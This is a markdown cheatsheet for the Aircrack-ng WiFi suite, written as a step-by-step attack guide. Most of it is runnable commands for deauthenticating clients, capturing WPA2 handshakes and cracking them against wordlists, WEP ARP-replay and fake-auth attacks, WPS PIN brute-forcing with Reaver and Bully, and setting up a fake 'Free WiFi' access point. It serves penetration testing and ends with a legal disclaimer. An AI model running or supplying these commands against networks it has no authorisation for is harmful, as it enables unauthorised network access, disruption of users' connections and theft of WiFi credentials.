# 📶 Aircrack-ng - WiFi Hacking Suite Cheatsheet

```
   █████╗ ██╗██████╗  ██████╗██████╗  █████╗  ██████╗██╗  ██╗
  ██╔══██╗██║██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝
  ███████║██║██████╔╝██║     ██████╔╝███████║██║     █████╔╝ 
  ██╔══██║██║██╔══██╗██║     ██╔══██╗██╔══██║██║     ██╔═██╗ 
  ██║  ██║██║██║  ██║╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗
  ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
                    WiFi Hacking Suite
```

<p align="center">
  <img src="https://img.shields.io/badge/Aircrack--ng-WiFi_Hacking-blue?style=for-the-badge" alt="Aircrack-ng">
  <img src="https://img.shields.io/badge/WPA2-Cracking-red?style=for-the-badge" alt="WPA2">
  <img src="https://img.shields.io/badge/Wireless-Security-green?style=for-the-badge" alt="Wireless">
</p>

---

## 📋 Table of Contents

- [What is Aircrack-ng](#-what-is-aircrack-ng)
- [Installation](#-installation)
- [Monitor Mode](#-monitor-mode)
- [Reconnaissance (airodump-ng)](#-reconnaissance-airodump-ng)
- [Deauthentication (aireplay-ng)](#-deauthentication-aireplay-ng)
- [WPA/WPA2 Cracking](#-wpawpa2-cracking)
- [WEP Cracking](#-wep-cracking)
- [WPS Attacks](#-wps-attacks)
- [Additional Tools](#-additional-tools)
- [Complete Attack Workflow](#-complete-attack-workflow)
- [Quick Reference](#-quick-reference)

---

## 🎯 What is Aircrack-ng

**Aircrack-ng** is a complete suite for WiFi network security assessment. It includes:

- 📡 **airodump-ng** - Packet capture & network detection
- 💥 **aireplay-ng** - Packet injection & deauth attacks
- 🔓 **aircrack-ng** - WEP & WPA/WPA2 key cracker
- 🔧 **airmon-ng** - Enable/disable monitor mode
- 📝 **airodecap-ng** - Decrypt captured traffic

### Requirements

| Requirement | Description |
|-------------|-------------|
| **Wireless Adapter** | Must support monitor mode & packet injection |
| **Supported Chipsets** | Atheros, Ralink, Realtek (some) |
| **Operating System** | Linux recommended (Kali) |

### Popular Compatible Adapters

| Adapter | Chipset | Notes |
|---------|---------|-------|
| Alfa AWUS036ACH | RTL8812AU | Dual-band, powerful |
| Alfa AWUS036NHA | Atheros AR9271 | Classic, reliable |
| TP-Link TL-WN722N v1 | Atheros AR9271 | Budget option |

---

## 🚀 Installation

### Kali Linux (Pre-installed)

```bash
# Already installed, verify version
aircrack-ng --version

# Update
sudo apt update && sudo apt install aircrack-ng
```

### Debian/Ubuntu

```bash
sudo apt update
sudo apt install aircrack-ng
```

### From Source

```bash
git clone https://github.com/aircrack-ng/aircrack-ng.git
cd aircrack-ng
autoreconf -i
./configure
make
sudo make install
```

---

## 📡 Monitor Mode

### Check Wireless Interface

```bash
# List wireless interfaces
iwconfig

# Or
iw dev

# Or
airmon-ng
```

### Enable Monitor Mode

```bash
# Method 1: airmon-ng (recommended)
sudo airmon-ng start wlan0

# Output: Monitor mode enabled on wlan0mon

# Method 2: Manual
sudo ifconfig wlan0 down
sudo iwconfig wlan0 mode monitor
sudo ifconfig wlan0 up
```

### Kill Interfering Processes

```bash
# Kill processes that may interfere
sudo airmon-ng check kill

# Or manually
sudo systemctl stop NetworkManager
sudo killall wpa_supplicant
```

### Disable Monitor Mode

```bash
# Stop monitor mode
sudo airmon-ng stop wlan0mon

# Restart NetworkManager
sudo systemctl start NetworkManager
```

### Change Channel

```bash
# Set specific channel
sudo iwconfig wlan0mon channel 6

# Or with airmon-ng
sudo airmon-ng start wlan0 6
```

---

## 🔍 Reconnaissance (airodump-ng)

### Basic Scan

```bash
# Scan all networks
sudo airodump-ng wlan0mon

# Output:
# BSSID              PWR  CH  ENC   AUTH  ESSID
# AA:BB:CC:DD:EE:FF  -45   6  WPA2  PSK   TargetNetwork
```

### Scan Specific Band

```bash
# 2.4GHz only
sudo airodump-ng --band g wlan0mon

# 5GHz only
sudo airodump-ng --band a wlan0mon

# Both bands
sudo airodump-ng --band abg wlan0mon
```

### Target Specific Network

```bash
# Filter by channel and BSSID
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF wlan0mon

# Write capture to file
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Creates: capture-01.cap, capture-01.csv, etc.
```

### Understanding Output

```
BSSID              PWR  Beacons  #Data  CH  MB  ENC   CIPHER  AUTH  ESSID
AA:BB:CC:DD:EE:FF  -45  150      45     6   54  WPA2  CCMP    PSK   HomeNetwork

BSSID              STATION            PWR   Rate  Lost  Frames  Notes
AA:BB:CC:DD:EE:FF  11:22:33:44:55:66  -50   54e-54e  0    125    
```

| Field | Description |
|-------|-------------|
| BSSID | AP MAC address |
| PWR | Signal strength (closer to 0 = stronger) |
| Beacons | Number of beacon frames |
| #Data | Number of data packets |
| CH | Channel |
| ENC | Encryption (WPA2/WPA/WEP/OPN) |
| CIPHER | CCMP (AES) / TKIP |
| AUTH | PSK / MGT |
| ESSID | Network name |
| STATION | Connected client MAC |

### Filter Options

```bash
# Only show encrypted networks
sudo airodump-ng --encrypt wpa2 wlan0mon

# Only show WEP
sudo airodump-ng --encrypt wep wlan0mon

# Specific ESSID
sudo airodump-ng --essid "TargetNetwork" wlan0mon
```

---

## 💥 Deauthentication (aireplay-ng)

### Why Deauth?

Deauth forces clients to reconnect, capturing the 4-way handshake needed for WPA/WPA2 cracking.

### Deauth Single Client

```bash
# Deauth specific client
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# -0 : Deauth attack
# 5  : Number of deauths (0 = infinite)
# -a : AP BSSID
# -c : Client MAC
```

### Deauth All Clients

```bash
# Broadcast deauth (all clients)
sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# More aggressive
sudo aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF wlan0mon
```

### Check for Handshake

```
# In airodump-ng, look for:
WPA handshake: AA:BB:CC:DD:EE:FF

# This appears in the top-right corner
```

---

## 🔓 WPA/WPA2 Cracking

### Complete WPA2 Attack Workflow

```bash
# Step 1: Enable monitor mode
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Step 2: Scan for networks
sudo airodump-ng wlan0mon

# Step 3: Target specific network (capture)
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Step 4: Deauth client (new terminal)
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Step 5: Wait for handshake (shows in airodump-ng)
# "WPA handshake: AA:BB:CC:DD:EE:FF"

# Step 6: Crack with wordlist
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
```

### Dictionary Attack

```bash
# Basic dictionary attack
aircrack-ng -w wordlist.txt capture-01.cap

# Use rockyou
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# Multiple wordlists
aircrack-ng -w wordlist1.txt,wordlist2.txt capture-01.cap
```

### Specify Target ESSID

```bash
# If multiple networks in capture
aircrack-ng -w wordlist.txt -e "TargetNetwork" capture-01.cap

# Or by BSSID
aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF capture-01.cap
```

### Using Hashcat (Faster GPU)

```bash
# Convert cap to hashcat format
aircrack-ng capture-01.cap -J hashcat_file
# Creates: hashcat_file.hccapx

# Or use cap2hccapx
cap2hccapx capture-01.cap hashcat_file.hccapx

# Crack with Hashcat
hashcat -m 22000 hashcat_file.hccapx wordlist.txt

# hashcat -m 2500 for older hccap format
```

### Convert Formats

```bash
# CAP to HCCAPX (Hashcat)
aircrack-ng capture-01.cap -j hashcat_output

# CAP to PCAP
editcap capture-01.cap output.pcap

# Merge multiple caps
mergecap -w merged.cap capture-01.cap capture-02.cap
```

---

## 🔐 WEP Cracking

> ⚠️ WEP is obsolete and insecure. Most networks use WPA2/WPA3 now.

### WEP Attack Types

| Attack | Description |
|--------|-------------|
| ARP Replay | Capture & replay ARP packets |
| Fake Auth | Associate with AP without key |
| Fragmentation | Generate keystream |
| ChopChop | Decrypt packets without key |

### Basic WEP Attack

```bash
# Step 1: Capture traffic
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep_capture wlan0mon

# Step 2: Fake authentication
sudo aireplay-ng -1 0 -a AA:BB:CC:DD:EE:FF -h <your_mac> wlan0mon

# Step 3: ARP replay attack
sudo aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h <your_mac> wlan0mon

# Step 4: Crack when enough IVs (>50,000)
sudo aircrack-ng wep_capture-01.cap
```

### aireplay-ng Attack Modes

| Mode | Description |
|------|-------------|
| `-0` | Deauthentication |
| `-1` | Fake authentication |
| `-2` | Interactive packet replay |
| `-3` | ARP request replay |
| `-4` | KoreK chopchop attack |
| `-5` | Fragmentation attack |
| `-9` | Injection test |

---

## 🔓 WPS Attacks

### Using Reaver

```bash
# Install Reaver
sudo apt install reaver

# Basic WPS attack
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv

# With channel
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -vv

# Pixie-Dust attack (faster)
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1 -vv
```

### Using Bully

```bash
# Install Bully
sudo apt install bully

# Basic attack
sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -v 3

# Pixie-Dust
sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -d -v 3
```

### Wash (Find WPS-enabled APs)

```bash
# Scan for WPS networks
sudo wash -i wlan0mon

# Output shows:
# BSSID              Ch  dBm  WPS  Lck  Vendor  ESSID
# AA:BB:CC:DD:EE:FF   6  -45  2.0  No   Realtek HomeNetwork
```

---

## 🔧 Additional Tools

### airbase-ng (Fake AP)

```bash
# Create fake AP
sudo airbase-ng -e "Free WiFi" -c 6 wlan0mon

# With specific BSSID
sudo airbase-ng -e "Free WiFi" -a AA:BB:CC:DD:EE:FF -c 6 wlan0mon
```

### airdecap-ng (Decrypt Captures)

```bash
# Decrypt WPA capture with known key
airdecap-ng -e "NetworkName" -p "password123" capture-01.cap

# Decrypt WEP capture
airdecap-ng -w <wep_key> capture-01.cap
```

### aircrack-ng Options

```bash
# Show all options
aircrack-ng --help

# Use multiple CPU cores
aircrack-ng -p 4 -w wordlist.txt capture-01.cap

# Quiet mode
aircrack-ng -q -w wordlist.txt capture-01.cap

# Specify ESSID
aircrack-ng -e "NetworkName" -w wordlist.txt capture-01.cap
```

### packetforge-ng (Create Packets)

```bash
# Create ARP packet
packetforge-ng -0 -a AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 -k 255.255.255.255 -l 255.255.255.255 -y fragment.xor -w arp_packet
```

---

## 🎯 Complete Attack Workflow

### WPA2 Attack (Step by Step)

```bash
# Terminal 1: Preparation
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Verify monitor mode
iwconfig  # Should show wlan0mon

# Terminal 1: Scan networks
sudo airodump-ng wlan0mon
# Note: BSSID, CH, ESSID of target

# Terminal 1: Target & capture
sudo airodump-ng -c <CHANNEL> --bssid <TARGET_BSSID> -w handshake wlan0mon

# Terminal 2: Deauth attack
sudo aireplay-ng -0 5 -a <TARGET_BSSID> -c <CLIENT_MAC> wlan0mon

# Wait for "WPA handshake: XX:XX:XX:XX:XX:XX" in Terminal 1
# Press Ctrl+C to stop capture

# Terminal 1: Crack handshake
aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake-01.cap

# Or with Hashcat (GPU - faster)
aircrack-ng handshake-01.cap -j hashcat_file
hashcat -m 22000 hashcat_file.hccapx /usr/share/wordlists/rockyou.txt
```

### Post-Attack Cleanup

```bash
# Stop monitor mode
sudo airmon-ng stop wlan0mon

# Restart NetworkManager
sudo systemctl start NetworkManager

# Clean up files (optional)
rm -f handshake-*.cap handshake-*.csv handshake-*.kismet.csv
```

---

## 📊 Quick Reference

### Essential Commands

| Purpose | Command |
|---------|---------|
| Start monitor mode | `airmon-ng start wlan0` |
| Stop monitor mode | `airmon-ng stop wlan0mon` |
| Kill interfering | `airmon-ng check kill` |
| Scan networks | `airodump-ng wlan0mon` |
| Target network | `airodump-ng -c CH --bssid BSSID -w file wlan0mon` |
| Deauth | `aireplay-ng -0 5 -a BSSID -c CLIENT wlan0mon` |
| Crack WPA | `aircrack-ng -w wordlist.txt capture.cap` |

### Attack Summary

| Attack | Encryption | Method |
|--------|------------|--------|
| Dictionary | WPA/WPA2 | Capture handshake → Crack with wordlist |
| Reaver | WPS | Brute force WPS PIN |
| Pixie-Dust | WPS | Offline WPS attack |
| ARP Replay | WEP | Collect IVs → Crack key |

### Useful Wordlists

| Path | Description |
|------|-------------|
| `/usr/share/wordlists/rockyou.txt` | Most common (Kali) |
| `/usr/share/wordlists/fasttrack.txt` | Quick check |
| `/usr/share/seclists/Passwords/` | SecLists collection |

### Troubleshooting

```bash
# Interface won't go to monitor mode
sudo rfkill unblock wifi
sudo rfkill unblock all

# Check if driver supports injection
sudo aireplay-ng -9 wlan0mon

# No handshake captured
# - Move closer to target
# - Try different clients
# - Deauth more aggressively
# - Wait longer

# Airmon says "Found X processes"
sudo airmon-ng check kill
```

---

## ⚠️ Legal Disclaimer

```
⚠️ WARNING: Only use these tools on networks you OWN or have 
EXPLICIT WRITTEN PERMISSION to test. Unauthorized access to 
computer networks is ILLEGAL in most jurisdictions.

Use responsibly for:
✅ Security auditing
✅ Penetration testing (with permission)
✅ Educational purposes (lab environment)

Never use for:
❌ Unauthorized network access
❌ Stealing credentials
❌ Any malicious purposes
```

---

## 📚 Resources

- [Aircrack-ng Official](https://www.aircrack-ng.org/)
- [Aircrack-ng Wiki](https://www.aircrack-ng.org/doku.php)
- [Hashcat WiFi](https://hashcat.net/wiki/)

### Related Cheatsheets
- [Hashcat](../Hashcat/README.md)
- [Wireshark](../Wireshark/README.md)
- [Linux Commands](../Linux-Commands/README.md)

---

<p align="center">
  <b>📶 Master WiFi Security Testing!</b><br>
  <i>Aircrack-ng - The WiFi pentester's best friend</i>
</p>
